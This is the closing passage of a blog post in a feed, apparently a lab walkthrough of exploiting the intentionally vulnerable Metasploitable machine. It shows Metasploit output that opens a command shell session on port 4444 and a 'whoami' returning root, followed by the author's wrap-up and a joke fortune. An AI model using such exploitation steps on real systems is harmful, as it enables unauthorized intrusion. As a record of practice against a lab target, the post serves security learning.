[</em>] Command: echo 7Kx3j4QvoI7LOU5z;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;7Kx3j4QvoI7LOU5z\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:35889) at 2014-06-08 16:51:56 +0300</p>

<p>whoami
root
```</p>

<p>Another port, another shell!</p>

<p>This turned out to be a a very lengthy post. There were some ports I couldn&rsquo;t find an exploit for, so can&rsquo;t determine if the underlying services were exploitable or not. Overall, owning Metasploitable in multiple ways and documenting it was the goal of this post.</p>

<p>Today&rsquo;s cookie:</p>

<blockquote><p>You will be a winner today.  Pick a fight with a four-year-old.</p></blockquote>
]]></content>
  </entry>
  
</feed>
